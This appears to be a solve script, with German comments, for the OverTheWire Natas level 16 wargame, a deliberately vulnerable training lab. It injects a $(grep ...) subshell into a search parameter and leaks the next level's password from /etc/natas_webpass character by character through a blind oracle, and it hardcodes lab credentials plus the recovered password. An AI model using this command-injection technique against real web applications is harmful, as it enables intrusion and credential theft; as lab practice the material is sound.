# wir können subshells injecten mit $()
# $(grep -E ^x.* /etc/natas_webpass/natas17) ist unsere payload
# returnt password, wenn pw mit x anfängt -> grep -i "password" dictionary.txt, was natürlich nichts returnt
# weil pw nicht im dict steht. DH, wenn wir nichts zurückbekommen, dann fängt pw mit x an
# wenn pw nicht mit x anfängt haben wir grep -i "" dictionary.txt, dann bekommen wir gesamtes dict back


import requests
from string import digits, ascii_lowercase, ascii_uppercase


url="http://natas16.natas.labs.overthewire.org/index.php"
auth_pw= "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh"
chars = ascii_lowercase + ascii_uppercase + digits
password = ""
user_exists = "This user exists"


pw_len = len(auth_pw)

for i in range(pw_len):
    for curr_char in chars:
        curr_pw = password + curr_char
        print("trying password: " + curr_pw)
        params = {'needle': '$(grep -E ^' + curr_pw + '.* /etc/natas_webpass/natas17)'}
        s = requests.Session()
        s.auth = ('natas16', auth_pw)
        r = s.get(url, params=params)
        if "African" not in r.text:
            password = curr_pw
            print("current password: " + curr_pw)
            break

# 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw